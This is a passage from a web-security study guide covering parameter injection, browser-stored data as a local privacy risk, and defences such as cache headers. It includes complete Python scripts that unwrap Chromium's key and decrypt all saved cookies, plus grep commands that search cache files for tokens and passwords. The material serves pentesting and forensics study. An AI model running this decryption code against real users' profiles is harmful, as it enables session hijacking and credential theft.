Attackers can chain encodings (double-encoding) or use multiple injected parameters to create staged behaviors (one payload runs when opening a message, another when returning to the inbox). They can also inject parameters that change which server-side branch executes, or add parameters required by powerful actions (delete-all, forwarding rules).

*How to test quickly:*

1. Find pages that echo query-string values into ```href```/```action``` attributes.

2. Inject ```%26name=value``` (encoded ```&```) into those parameters and view the generated links in an intercepting proxy or the browser inspector.

3. Click or simulate the link and observe server behavior; watch whether the first or last parameter value is used.

Common *delivery vectors* attackers try (so defenders can test them): crafted query-strings embedded in links (email, chat, forums), content you control (malicious posts or comment fields), or chaining via open-redirects/proxies. For *testing* in a safe way, use Burp to craft and inspect requests, build your payloads against a local VM or a test account, and preview generated links in the browser/inspector — don’t send them to real users.

*Defenses:*

- Canonicalize and validate any value before embedding it into URLs — *do not* copy raw query values into link HREFs.

- Encode values properly when inserting into attributes (```encodeURIComponent```) so they can’t inject separators.

- Prefer server-side generation of action links using safe server-side values, or build links from a server-maintained mapping rather than echoing user-supplied strings.

- Where parameter ambiguity is dangerous, require explicit POST confirmations with per-request CSRF tokens and server-side checking of expected parameter sets.

### Local Privacy Attacks:

Many apps persist data on the *user’s machine* (cookies, cached pages, local DBs, autofill, etc.). If another user or attacker gains local access to that machine (shared PC, stolen laptop, or malicious app), they can often read those artifacts and harvest sensitive data. For testing, always use a *clean VM* so you can clearly see what the app writes.

- Assume anything stored client-side is readable by a local attacker.

- Don’t store secrets on the client; if you must, encrypt and tie to user credentials.

- Use ```Cache-Control```/```Expires```/```Pragma``` correctly and prefer HTTPS everywhere.

- Mark important cookies ```HttpOnly; Secure; SameSite``` and keep them short-lived.

#### Persistent Cookies:

*How to find:* look for ```Set-Cookie``` with an ```Expires```/```Max-Age``` in the future (persistent cookie).

*Risk:* persistent cookies can re-authenticate or be replayed by a local attacker even if encrypted.

*Defence:* avoid storing session tokens in long-lived cookies; use HttpOnly, Secure, SameSite, short lifetimes, and rotate tokens on sensitive actions.

#### Cached Web Content:

*Why it matters:* browsers cache non-HTTPS (and sometimes HTTPS if headers allow) content on disk. Sensitive pages may appear in the cache or as history entries.

*What to check (HACK STEPS):*

1. Map sensitive pages and inspect response headers for caching directives.

2. Ensure pages carrying PII/authenticated content send appropriate headers:

- ```Cache-Control: no-store, no-cache, must-revalidate```

- ```Pragma: no-cache```

- ```Expires: 0```

3. Test on a clean browser: clear profile, load pages, then inspect cache files for leaked content.

*Default cache locations (modern):*

- Chrome (Windows): ```%LocalAppData%\Google\Chrome\User Data\Default\Cache```

- Chrome (macOS): ```~/Library/Caches/Google/Chrome/Default/Cache```

- Chrome (Linux): ```~/.cache/google-chrome/Default/Cache```

- Edge (Chromium): ```%LocalAppData%\Microsoft\Edge\User Data\Default\Cache```

- Firefox (all OS): profile cache in ```cache2``` folder, e.g. ```%AppData%\Mozilla\Firefox\Profiles\<profile>\cache2``` (Windows) or ```~/.cache/mozilla/firefox/<profile>/cache2``` (Linux)

- Opera: ```%AppData%\Opera Software\Opera Stable\Cache``` or the corresponding profile path on other OSes.

*Evidence files:* Chrome/Edge also keep history and cookies as SQLite files (```History```, ```Cookies```, ```Web Data```) inside the profile folder — these are easy to open and grep.

#### Browsing History & URL data:

*Pitfall:* any sensitive data in URLs (query strings) often lands in history.

*Test:* locate pages that put secrets in URLs and then inspect the browser History DB (e.g., Chrome ```History``` SQLite).

*Fix:* don’t put secrets or tokens in query strings; use POST or session-bound tokens.

#### Autocomplete / Autofill:

*Reality check (modern):* browsers continue to persist autofill/form data, but storage formats changed:

- Chrome: autofill stored in profile ```Web Data``` SQLite (```autofill```, ```autofill_profiles``` tables).

- Firefox: form history in ```formhistory.sqlite``` (profile dir).

- Edge (Chromium): same profile DB model as Chrome.

Browsers may ignore ```autocomplete="off"``` for login forms/passwords, but you should still mark sensitive fields with ```autocomplete="off"``` and avoid client-side storage of secrets.

*HACK STEPS:* inspect profile DBs or use DevTools to see what fields autofill; review HTML for ```autocomplete``` attributes.

#### Web SQL / IndexedDB / LocalStorage / Service Workers:

*What to check:* what the app stores client-side (messages, tokens, PII).

*Where:* these are inside the browser profile (IndexedDB folders, Local Storage files).

*Risk:* stored data can be read by local attackers or exfiltrated via XSS if present.

*Defence:* avoid storing secrets, or encrypt and bind to user credentials; use CSP to reduce XSS risk.

#### Flash LSOs & Silverlight Isolated Storage (legacy):

Flash & Silverlight are deprecated in modern browsers, but legacy environments may still contain LSOs or Silverlight storage.

*Example locations (legacy):*

- Flash LSOs: ```%AppData%\Macromedia\Flash Player\#SharedObjects\{random}\{domain}\...```

- Silverlight Isolated Storage: ```%LocalAppData%\Microsoft\Silverlight\``` (deeply nested)

(Keep these in notes for old intranet audits — but treat them as legacy.)

*Practical pentester checklist (local privacy):*

1. Use a *fresh VM* and a clean browser profile.

2. Browse the app as a normal user, then inspect: cookies, profile SQLite DBs (```Cookies```, ```History```, ```Web Data```), cache files, IndexedDB/LocalStorage, and autofill stores.

3. Search the cache/history for sensitive strings from pages (emails, tokens, PII).

4. Verify ```Cache-Control```/```Set-Cookie``` flags and lack of secrets in URLs.

5. If you find sensitive data persisted, recommend server-side fixes, header changes, or client design changes.

*Additional Notes:* You can open Chrome/Firefox/other browser SQLite files on Kali with the usual tools (just work on a *copy* of the DB while the browser is closed to avoid corruption). Quick options:

- Command line: ```sqlite3 ~/path/to/Cookies``` then run SQL like ```SELECT host_key, name FROM cookies LIMIT 20;```.

- GUI: install ```sqlitebrowser``` (DB Browser for SQLite) — ```sudo apt install sqlitebrowser``` — then open the file and browse tables/rows.

- Python (quick script): ```import sqlite3; db=sqlite3.connect('Cookies'); cur=db.execute("SELECT name,value FROM cookies LIMIT 10"); print(cur.fetchall())```.

*Caveats:* some cookie values (Chromium/Chrome) are *encrypted* on modern systems — the ```encrypted_value``` column needs platform-specific decryption (DPAPI, Keyring/libsecret, Keychain), so you may not see plaintext immediately. Usually you can decrypt Chrome/Chromium-based browsers’ encrypted cookie blobs *locally*, but only if you have access to the same user profile/OS credentials (or equivalent secrets). How this works depends on the OS:

- Browsers store cookies in a SQLite DB (```Cookies```), column ```encrypted_value``` (binary). Recent Chrome/Chromium use an AES key to encrypt cookie values and store that AES key encrypted in the ```Local State``` file. The ```encrypted_value``` blobs typically start with a prefix like ```v10``` (or ```v11```) that signals AES-GCM.

- The AES key itself is protected using the platform’s secret store: *Windows DPAPI (CryptProtectData/CryptUnprotectData), macOS Keychain*, or *Linux libsecret / GNOME Keyring* (or, on some Linux setups, no OS keyring so the key may be effectively plaintext).

- Therefore, you can decrypt cookies if you can recover the AES key (by calling the OS decryption API while running as the same user) and then AES-GCM-decrypt the cookie blob.

*Practical requirements / constraints:*

- You need *local access* to the browser profile files (```Local State``` + ```Cookies```) and the ability to call the OS decryption API using the *same user account* (or obtain the OS credentials). Without that, DPAPI/Keychain will block decryption.

- On Windows you can decrypt if you are the same Windows user (or have DPAPI master keys); on macOS you need access to the user keychain (or the user’s login password); on Linux you need access to the libsecret/keyring session (or a system that doesn’t protect the key).

*How to do it (recipe + brief code sketch):*

1. Copy the browser profile files while the browser is closed:

- ```Cookies``` (SQLite) and ```Local State``` (JSON).

2. Extract and decode the encrypted key from ```Local State```:

- ```encrypted_key_b64 = json['os_crypt']['encrypted_key']```

- ```encrypted_key = base64.b64decode(encrypted_key_b64)```

- On Windows ```encrypted_key``` typically starts with ```b'DPAPI'``` — strip the prefix (```encrypted_key[5:]```) before calling ```CryptUnprotectData```.

3. Decrypt the AES key with the OS API:

- Windows: ```CryptUnprotectData(encrypted_key[5:])``` → ```key```

- macOS: use the Keychain APIs to retrieve/unprotect the key (or use ```security``` CLI / Keychain frameworks)

- Linux: retrieve from libsecret / gnome-keyring (D-Bus) or fallback behavior depends on distro/config

4. Decrypt each ```encrypted_value``` that starts with ```v10```/```v11```: parse it as ```prefix(3) | nonce(12) | ciphertext+tag```, then AES-GCM-decrypt with the recovered ```key```.

*Quick breakdown of the pieces and flow:*

- ```Local State``` (*JSON*) — contains ```os_crypt.encrypted_key``` as a Base64 string. That value is the browser’s *AES key*, itself encrypted with the OS secret (DPAPI on Windows, Keychain on macOS, libsecret/Keyring on Linux).

- Extract + decode — base64-decode ```os_crypt.encrypted_key```, strip any prefix (e.g. ```DPAPI```) and call the OS decryption API (or library) to recover the raw AES key.

- ```Cookies``` DB — each cookie value is stored (binary) in ```encrypted_value```. Modern Chromium prefixes these with ```v10```/```v11``` and use AES-GCM: the blob = ```prefix(3) || nonce(12) || ciphertext || tag(16)```.

- Decrypt cookies — use the AES key from step (2) and AES-GCM (nonce + ciphertext + tag) to recover the plaintext cookie value.

- you must be able to run the OS decryption step as the same user (or have access to that user’s OS secrets). On some Linux installs there may be no keyring configured and the key may be easier to access; on others it’s protected.

*Minimal Python sketch (Windows + AES-GCM step):*

*Notes:* the sketch actually shows the whole flow, not only extracting the Local State key. It:

1. reads the ```Local State``` JSON and base64-decodes ```os_crypt.encrypted_key```,

2. uses the OS API (DPAPI in the sketch via ```win32crypt```) to decrypt that AES key, and then

3. opens the ```Cookies``` SQLite and AES-GCM-decrypts each ```encrypted_value``` (the ```v10```/```v11``` blobs) using that key.

So it covers key extraction + key unwrapping + cookie decryption — the three pieces you need.

```
# WARNING: for lab use only. Requires 'pycryptodome' on pip and running as the same user.
import json, base64, sqlite3, ctypes
from Crypto.Cipher import AES

# 1) load Local State and get encrypted key
with open(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State', 'r', encoding='utf-8') as f:
    local_state = json.load(f)
enc_key_b64 = local_state['os_crypt']['encrypted_key']
enc_key = base64.b64decode(enc_key_b64)           # usually starts with b'DPAPI' on Windows

# 2) decrypt AES key (Windows DPAPI)
# strip 'DPAPI' prefix:
enc_key_dpapi = enc_key[5:]
# call CryptUnprotectData
crypt_unprotect = ctypes.windll.crypt32.CryptUnprotectData
# ... (call via ctypes.CryptUnprotectData) ...
# For brevity use win32crypt if available:
import win32crypt
key = win32crypt.CryptUnprotectData(enc_key_dpapi, None, None, None, 0)[1]

# 3) open cookie DB
conn = sqlite3.connect(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies')
cur = conn.cursor()
cur.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 10")
for host, name, enc_val in cur.fetchall():
    enc_val = bytes(enc_val)
    if enc_val.startswith(b'v10') or enc_val.startswith(b'v11'):
        nonce = enc_val[3:15]
        ciphertext = enc_val[15:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
        print(host, name, plaintext.decode('utf-8', errors='replace'))
```

*Additional Notes:*

- On Windows, ```win32crypt.CryptUnprotectData``` is the easy route.

- On macOS, you’d use ```security``` or a Keychain API to access the protected key; Python packages like ```keyring``` can help.

- On Linux, use ```secretstorage``` (DBus) / ```libsecret``` to access GNOME Keyring; if no keyring is configured the Local State key might be stored unprotected (depends on build/config).

- Many existing libraries/tools automate this (e.g., ```browser_cookie3```, forensic tools) — they implement the above logic cross-platform.

*Useful tooling / shortcuts:*

- ```sqlite3``` (command line) or ```DB Browser for SQLite``` to view the ```Cookies``` DB (but fields are encrypted).

- ```browser_cookie3``` (Python) or other scripts that already handle platform decryption for you (handy in a lab).

- ```win32crypt``` on Windows to call DPAPI; ```secretstorage``` / ```keyring``` on Linux/macOS.

**Bonus:** *the long, fully-commented cross-platform script:*

It attempts to handle Windows (DPAPI), macOS (Keychain / legacy PBKDF2 fallback), and Linux (GNOME Keyring / libsecret) and will explain where things may fail or need extra privileges. Read the comments — they explain what each part does so you don’t need extra notes later.

Dependencies (install in your lab VM):

```
pip install pycryptodome keyring secretstorage
# On Windows you probably want pywin32:
pip install pywin32
# On macOS you may need 'pyobjc' for direct Keychain access in advanced cases,
# but keyring often suffices:
pip install pyobjc
```

Script (lab-only). Save as ```chromecookie_decrypt.py``` and run from the same user account that owns the browser profile (or run against a copy of the profile while the browser is closed).

```
#!/usr/bin/env python3
"""
Cross-platform helper to decrypt Chromium-based browser cookies from a
copied profile. Designed for lab / forensic / defensive use only.

Supports:
 - Windows (DPAPI -> decrypt Local State key -> AES-GCM decrypt cookies)
 - macOS (Keychain / best-effort fallbacks; may require keyring access)
 - Linux (libsecret / keyring, best-effort; many distros use gnome-keyring)

Important:
 - Always work on copies of 'Cookies' and 'Local State' (do not open a
   live DB while the browser is running).
 - You must run as the same OS user who owns the profile (or otherwise
   have access to that user's OS secrets) to decrypt the Local State key.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import argparse
import platform
from pathlib import Path

# Crypto primitives
from Crypto.Cipher import AES

# Optional platform helpers
try:
    import win32crypt  # pywin32 (Windows DPAPI)
except Exception:
    win32crypt = None

try:
    import keyring  # cross-platform keyring (may wrap Keychain/libsecret)
except Exception:
    keyring = None

# secretstorage is used for Linux/gnome-keyring access (optional)
try:
    import secretstorage
except Exception:
    secretstorage = None


def chrome_local_state_paths():
    """Return common Local State paths for Chromium-based browsers by OS."""
    home = Path.home()
    system = platform.system()
    paths = []
    if system == "Windows":
        local_app = Path(os.getenv("LOCALAPPDATA", ""))  # e.g. C:\Users\You\AppData\Local
        # Common Chromium derivatives
        candidates = [
            local_app / "Google" / "Chrome" / "User Data" / "Local State",
            local_app / "Microsoft" / "Edge" / "User Data" / "Local State",
            local_app / "BraveSoftware" / "Brave-Browser" / "User Data" / "Local State",
            local_app / "Yandex" / "YandexBrowser" / "User Data" / "Local State",
        ]
        paths = candidates
    elif system == "Darwin":  # macOS
        candidates = [
            home / "Library" / "Application Support" / "Google" / "Chrome" / "Local State",
            home / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser" / "Local State",
            home / "Library" / "Application Support" / "Microsoft Edge" / "Local State",
        ]
        paths = candidates
    else:  # Linux and others
        xdg = Path(os.getenv("XDG_CONFIG_HOME", home / ".config"))
        candidates = [
            xdg / "google-chrome" / "Local State",
            xdg / "chromium" / "Local State",
            xdg / "brave" / "Local State",
            xdg / "microsoft-edge" / "Local State",
        ]
        paths = candidates
    return [p for p in paths if p.exists()]


def chrome_cookie_db_paths():
    """Return typical cookie sqlite DB paths for Chromium-based browsers."""
    home = Path.home()
    system = platform.system()
    paths = []
    if system == "Windows":
        local_app = Path(os.getenv("LOCALAPPDATA", ""))
        candidates = [
            local_app / "Google" / "Chrome" / "User Data" / "Default" / "Cookies",
            local_app / "Microsoft" / "Edge" / "User Data" / "Default" / "Cookies",
            local_app / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Cookies",
        ]
        paths = candidates
    elif system == "Darwin":
        candidates = [
            home / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Cookies",
            home / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser" / "Default" / "Cookies",
            home / "Library" / "Application Support" / "Microsoft Edge" / "Default" / "Cookies",
        ]
        paths = candidates
    else:
        xdg = Path(os.getenv("XDG_CONFIG_HOME", home / ".config"))
        candidates = [
            xdg / "google-chrome" / "Default" / "Cookies",
            xdg / "chromium" / "Default" / "Cookies",
            xdg / "brave" / "Default" / "Cookies",
            xdg / "microsoft-edge" / "Default" / "Cookies",
        ]
        paths = candidates
    return [p for p in paths if p.exists()]


def load_local_state_key(local_state_path: Path):
    """
    Read Local State file and extract base64 encrypted key.
    Returns raw encrypted bytes.
    """
    data = json.loads(local_state_path.read_text(encoding="utf-8"))
    try:
        enc_key_b64 = data["os_crypt"]["encrypted_key"]
    except KeyError:
        raise ValueError("Local State does not contain os_crypt.encrypted_key")
    enc_key = base64.b64decode(enc_key_b64)
    return enc_key


def decrypt_key_windows(enc_key: bytes):
    """
    On Windows: DPAPI-protected key. Data usually starts with 'DPAPI' prefix.
    Use win32crypt.CryptUnprotectData to recover AES key.
    """
    if not win32crypt:
        raise EnvironmentError("win32crypt (pywin32) not available")
    # Chrome puts a "DPAPI" prefix (b'DPAPI') on the encrypted key
    if enc_key.startswith(b"DPAPI"):
        payload = enc_key[5:]
    else:
        payload = enc_key
    # CryptUnprotectData returns (description, data)
    decrypted = win32crypt.CryptUnprotectData(payload, None, None, None, 0)[1]
    return decrypted  # raw AES key


def decrypt_value_aes_gcm(enc_value: bytes, key: bytes):
    """
    Decrypt a Chromium 'v10'/'v11' encrypted_value blob with AES-GCM.
    Blob layout: b'v10' (3 bytes) + 12-byte nonce + ciphertext + 16-byte tag
    """
    if enc_value[:3] not in (b"v10", b"v11"):
        # older formats might be plain or OS-specific (Windows DPAPI used to be in encrypted_value)
        raise ValueError("Unexpected cookie blob prefix, not v10/v11")
    nonce = enc_value[3:15]          # 12 bytes
    ciphertext_tag = enc_value[15:]
    # last 16 bytes are tag (AES-GCM)
    if len(ciphertext_tag) < 16:
        raise ValueError("ciphertext too short")
    ciphertext = ciphertext_tag[:-16]
    tag = ciphertext_tag[-16:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext


def try_decrypt_cookies_windows(local_state_path: Path, cookie_db_path: Path, out_file=None):
    """
    Windows workflow:
     - extract encrypted_key from Local State
     - decrypt it via DPAPI (win32crypt)
     - open cookie DB and decrypt v10/v11 blobs
    """
    enc_key = load_local_state_key(local_state_path)
    key = decrypt_key_windows(enc_key)
    # Work on a copy of DB to avoid locks/corruption
    tmp_db = cookie_db_path.with_suffix(".copy")
    shutil.copy2(cookie_db_path, tmp_db)
    conn = sqlite3.connect(str(tmp_db))
    cur = conn.cursor()
    cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cur.fetchall()
    out_lines = []
    for host, name, enc_val in rows:
        enc_val = bytes(enc_val)
        try:
            if enc_val.startswith(b"v10") or enc_val.startswith(b"v11"):
                val = decrypt_value_aes_gcm(enc_val, key).decode("utf-8", errors="replace")
            else:
                # older Chrome stored plaintext or used DPAPI directly in encrypted_value
                try:
                    val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode("utf-8", errors="replace")
                except Exception:
                    val = "<non-decryptable blob>"
        except Exception as e:
            val = f"<decrypt error: {e}>"
        line = f"{host}\t{name}\t{val}"
        out_lines.append(line)
    conn.close()
    tmp_db.unlink(missing_ok=True)
    if out_file:
        Path(out_file).write_text("\n".join(out_lines), encoding="utf-8")
        print(f"Wrote decrypted cookies to {out_file}")
    else:
        print("\n".join(out_lines))


# macOS & Linux helpers: best-effort approaches. These may fail depending on keyring configuration.
def decrypt_key_mac(enc_key: bytes):
    """
    macOS best-effort:
    - Newer Chromium still uses Local State encrypted_key protected by Keychain
      and the encryption is typically performed by system APIs. Python-level
      decryption may need pyobjc to call Keychain APIs, or keyring library to
      access "Chrome Safe Storage" password and derive a key (legacy).
    - Here we attempt a couple of approaches:
      * If the encrypted key is prefixed with 'DPAPI' or similar, try to fallback (rare).
      * Try to use keyring.get_password('Chrome Safe Storage', 'Chrome') style to derive a key (legacy).
    NOTE: This is a best-effort helper: for reliable macOS decryption you may need
    to use native Keychain APIs or run a macOS-specific routine.
    """
    # Most modern macOS Chrome versions require Keychain calls — not trivial here.
    # We'll attempt the legacy "Chrome Safe Storage" PBKDF2 path as a fallback.
    try:
        # derive a key from the OS password entry for Chrome (legacy method)
        # Many macOS builds use keyring to store the cookie encryption key under a service name.
        if keyring:
            password = keyring.get_password("Chrome Safe Storage", "Chrome")
            if not password:
                password = keyring.get_password("Chromium Safe Storage", "Chromium")
            if password:
                # legacy derivation: PBKDF2 with fixed salt "saltysalt", 1003 iterations
                from Crypto.Protocol.KDF import PBKDF2
                salt = b"saltysalt"
                length = 16
                iterations = 1003
                key = PBKDF2(password, salt, dkLen=length, count=iterations)
                # Chrome then uses AES-CBC with that key for older versions (not v10/v11)
                return key
    except Exception:
        pass
    raise EnvironmentError("macOS decryption helper couldn't derive key — consider using native Keychain APIs or run on the original user session.")


def decrypt_key_linux(enc_key: bytes):
    """
    Linux: Chromium local state key may be protected using libsecret / GNOME Keyring.
    In many setups, the 'Local State' encrypted_key is a DPAPI-like blob protected
    by the user's keyring. We attempt to use secretstorage to obtain the necessary secret.
    """
    # This is highly environment-specific. Many setups of Chrome on Linux don't
    # use an extra wrapping and the encrypted_key may be directly decryptable.
    # We attempt to access the gnome keyring via secretstorage.
    if not secretstorage:
        raise EnvironmentError("secretstorage not available; cannot access GNOME keyring")
    try:
        bus = secretstorage.dbus_init()
        col = secretstorage.get_default_collection(bus)
        # Attempt to find a label that mentions 'Chromium Safe Storage' or similar.
        for item in col.get_all_items():
            label = item.get_label()
            if label and ("chromium" in label.lower() or "chrome" in label.lower() or "safe storage" in label.lower()):
                # try to get secret (may prompt)
                secret = item.get_secret()
                if secret:
                    # same legacy derivation approach as macOS fallback
                    from Crypto.Protocol.KDF import PBKDF2
                    salt = b"saltysalt"
                    length = 16
                    iterations = 1003
                    key = PBKDF2(secret.decode(), salt, dkLen=length, count=iterations)
                    return key
    except Exception as e:
        raise EnvironmentError(f"Linux keyring access error: {e}")
    raise EnvironmentError("Could not derive Linux key from keyring")


def try_decrypt_cookies_generic(local_state_path: Path, cookie_db_path: Path, out_file=None):
    """
    Generic best-effort: try to load Local State, choose a platform path to unwrap key,
    and attempt AES-GCM decryption. This may succeed on Linux/macos depending on environment.
    """
    enc_key = load_local_state_key(local_state_path)
    system = platform.system()
    key = None
    if system == "Windows":
        key = decrypt_key_windows(enc_key)
    elif system == "Darwin":
        # macOS: try Keychain/legacy
        key = decrypt_key_mac(enc_key)
    else:
        # Linux / other
        key = decrypt_key_linux(enc_key)

    # proceed like Windows to decrypt DB entries
    tmp_db = cookie_db_path.with_suffix(".copy")
    shutil.copy2(cookie_db_path, tmp_db)
    conn = sqlite3.connect(str(tmp_db))
    cur = conn.cursor()
    cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cur.fetchall()
    out_lines = []
    for host, name, enc_val in rows:
        enc_val = bytes(enc_val)
        try:
            if enc_val.startswith(b"v10") or enc_val.startswith(b"v11"):
                val = decrypt_value_aes_gcm(enc_val, key).decode("utf-8", errors="replace")
            else:
                val = "<non-v10 blob or encrypted differently>"
        except Exception as e:
            val = f"<decrypt error: {e}>"
        out_lines.append(f"{host}\t{name}\t{val}")
    conn.close()
    tmp_db.unlink(missing_ok=True)
    if out_file:
        Path(out_file).write_text("\n".join(out_lines), encoding="utf-8")
        print(f"Wrote decrypted cookies to {out_file}")
    else:
        print("\n".join(out_lines))


def choose_profile_and_run(args):
    # Try to auto-discover Local State and Cookies if the user didn't pass explicit paths
    local_paths = chrome_local_state_paths()
    cookie_paths = chrome_cookie_db_paths()
    print("Detected Local State candidates:", local_paths)
    print("Detected Cookies DB candidates:", cookie_paths)

    # Use provided args if present else first detected
    if args.local_state:
        ls = Path(args.local_state)
        if not ls.exists():
            print("Local State path does not exist:", ls)
            return
    else:
        if not local_paths:
            print("No Local State files found. Provide one with --local-state")
            return
        ls = local_paths[0]

    if args.cookies:
        cb = Path(args.cookies)
        if not cb.exists():
            print("Cookies DB path does not exist:", cb)
            return
    else:
        if not cookie_paths:
            print("No Cookies DB files found. Provide one with --cookies")
            return
        cb = cookie_paths[0]

    print(f"Using Local State: {ls}")
    print(f"Using Cookies DB: {cb}")
    # route to platform-aware handler
    system = platform.system()
    try:
        if system == "Windows":
            try_decrypt_cookies_windows(ls, cb, out_file=args.output)
        else:
            try_decrypt_cookies_generic(ls, cb, out_file=args.output)
    except Exception as e:
        print("Error:", e)
        print("Note: macOS and Linux flows are best-effort. You may need to run this on the original account/session or use native keyring/keychain tools.")


def main():
    p = argparse.ArgumentParser(description="Decrypt Chromium cookies (lab use only).")
    p.add_argument("--local-state", "-l", help="Path to 'Local State' file (JSON).")
    p.add_argument("--cookies", "-c", help="Path to 'Cookies' sqlite DB.")
    p.add_argument("--output", "-o", help="Output file to write decrypted cookies (default: stdout).")
    args = p.parse_args()
    choose_profile_and_run(args)


if __name__ == "__main__":
    main()
```

*How to use:*

- Close the browser whose profile you will inspect (very important).

- Copy the profile files to a safe folder (e.g., ```cp "User Data/Local State" /tmp/ls.json; cp "User Data/Default/Cookies" /tmp/Cookies```). Always operate on copies.

- Run the script on the same user account that owns the profile (or ensure you have the keyring access):

```
python3 chromecookie_decrypt.py --local-state /tmp/ls.json --cookies /tmp/Cookies -o /tmp/decrypted.txt
```

- Inspect ```/tmp/decrypted.txt```.

#### Internet Explorer ```userData```:

Before modern browsers introduced standardized local storage APIs, *Internet Explorer* had its own proprietary mechanism called ```userData```. This feature allowed web applications to store small amounts of persistent data (up to 64 KB per domain) directly on the client’s machine — kind of a primitive form of what we now call *localStorage*.

Unlike cookies, ```userData``` stored information in XML format and was accessible only to pages from the same domain. While obsolete today, it’s occasionally useful to know about it when examining legacy systems, intranets, or corporate web apps that still rely on Internet Explorer components.

If you’re doing forensic analysis or just poking around old environments, you can still locate and examine ```userData``` files directly on disk. For older or legacy installations of Internet Explorer, the data typically resides in:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Internet Explorer\UserData\Low\{random-folder-name}\
```

Each subfolder may contain XML files representing stored form data, preferences, or cached information. These can be opened and inspected manually using a text editor. If encryption is used (rarely), it’s usually basic obfuscation rather than strong crypto.

Internet Explorer is officially retired and replaced by Microsoft Edge. The ```userData``` feature no longer exists in modern browsers, but forensic traces can persist in archived or offline profiles. Knowing this can still help during investigations or retro-style CTFs that simulate legacy environments.

#### HTML5 Local Storage Mechanisms:

HTML5 modernized how browsers handle local data, introducing several APIs that allow web applications to store information directly in the client’s browser — without relying solely on cookies. Here are the three main storage types you’ll encounter:

1. Session Storage:

- Data is stored per browser tab and *cleared when the tab is closed.*

- Commonly used for storing temporary data like user input or interface state. Example (in JavaScript):

```
sessionStorage.setItem('theme', 'dark');
console.log(sessionStorage.getItem('theme')); // dark
```

2. Local Storage:

- Data persists *even after the browser is closed and reopened.*

- Useful for keeping user preferences, cached API data, or tokens (though not recommended for sensitive info). Example:

```
localStorage.setItem('username', 'MistyDreamer');
console.log(localStorage.getItem('username')); // MistyDreamer
```

3. IndexedDB / Database Storage:

- A *structured database* built into the browser that supports large-scale storage, indexing, and complex queries. Used by modern web apps like Gmail, Spotify Web, or PWAs for offline functionality. Example (simplified):

```
let dbRequest = indexedDB.open('myDatabase', 1);
dbRequest.onsuccess = (event) => console.log("DB ready!");
```

*Testing Tips:*

- You can view stored data through *browser developer tools* (Application → Storage).

- On disk, Chrome and Edge store this information in ```Web Data```, ```IndexedDB```, or ```Local Storage``` folders within the browser profile directory.

- These files are often SQLite databases, which can be examined with tools like *DB Browser for SQLite.*

Even though ```userData``` is now a relic from Internet Explorer’s past, the idea behind it lives on in HTML5’s storage APIs. For a hacker or forensic investigator, knowing where and how browsers store data can uncover session remnants, tokens, cached responses, or even credentials that were never properly cleared.

#### Quick CLI forensic snippets (Kali / Linux):

```
# copy profile files (work on copies)
cp ~/.config/google-chrome/Default/Cookies /tmp/Chrome-Cookies
cp ~/.config/google-chrome/Default/History /tmp/Chrome-History

# inspect Chrome cookies (SQLite) — many values are encrypted, but names/hosts are visible
sqlite3 /tmp/Chrome-Cookies "SELECT host_key, name FROM cookies ORDER BY host_key LIMIT 25;"

# grep cached/local storage (LevelDB / IndexedDB folder) for strings you care about
cd ~/.config/google-chrome/Default/Local\ Storage/leveldb
strings *.ldb | grep -i "token\|email\|session" -n

# Firefox history/cookies (profile locations vary)
sqlite3 ~/.mozilla/firefox/*/cookies.sqlite "SELECT host, name, value FROM moz_cookies LIMIT 20;"
sqlite3 ~/.mozilla/firefox/*/places.sqlite "SELECT url, title FROM moz_places WHERE url LIKE '%example.com%' LIMIT 20;"

# quick scan of cached HTML/text blobs (browser cache dir)
find ~/.cache/google-chrome/Default/Cache -type f -exec strings {} \; | grep -i "password\|token\|csrf" -n
```

*Notes:*

- Chrome cookie values are typically AES-encrypted (```encrypted_value```) — to decrypt you need the Local State key + OS unwrapping (see the earlier script here).

- LevelDB/IndexedDB stores are binary — ```strings``` + ```grep``` is a fast heuristic; use browser devtools or specialized tools for structured inspection.

### Preventing Local Privacy Attacks:

Applications must *avoid storing sensitive data* in persistent cookies.

Even if encrypted, cookies can still be stolen and *replayed* to impersonate a valid session. The attacker doesn’t need to decrypt them — just resubmitting the value is enough to gain access if the application uses them for authentication.

*Controlling Browser Caching:*

Sensitive pages (such as account dashboards, payment forms, or message inboxes) should not be stored in a browser’s cache. To prevent this, the server must send the correct *HTTP cache control directives.*

ASP Example:

```
<% 
Response.CacheControl = "no-cache"
Response.AddHeader "Pragma", "no-cache"
Response.Expires = 0
%>
```

- ```Cache-Control: no-cache``` — Tells browsers that this page must not be cached locally or reused from cache.

- ```Pragma: no-cache``` — A legacy HTTP/1.0 directive for backward compatibility. Some older proxies still rely on it.

- ```Expires = 0``` — Forces the page to be considered immediately “stale,” so the browser will always request it again.

Together, these headers ensure that the browser never stores sensitive pages and that even accidental “Back” button usage doesn’t expose private data.

Java (JSP/Servlet) Example:

```
<%
response.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
response.setHeader("Pragma", "no-cache");
response.setDateHeader("Expires", 0);
%>
```

- ```no-store``` — Stronger than ```no-cache```; it tells browsers *not to store any copy* of the page anywhere (cache, disk, or memory).

- ```must-revalidate``` — Forces the client to revalidate the page with the server before displaying it again.

- ```Pragma``` and ```Expires``` work the same as in ASP, adding legacy coverage and ensuring older intermediaries obey the rule.

*Avoiding Sensitive Data in URLs:*

Never transmit credentials, session tokens, or private information via *URL parameters.* URLs are often stored in:

- Browser history

- Web server logs

- Proxy logs

- Referer headers (when navigating between pages)

Instead, sensitive data should always be sent in *POST requests* within HTML forms.

*Disabling Autocomplete for Sensitive Fields:*

```
<form autocomplete="off">
  <input type="password" name="userPassword" autocomplete="off">
</form>
```

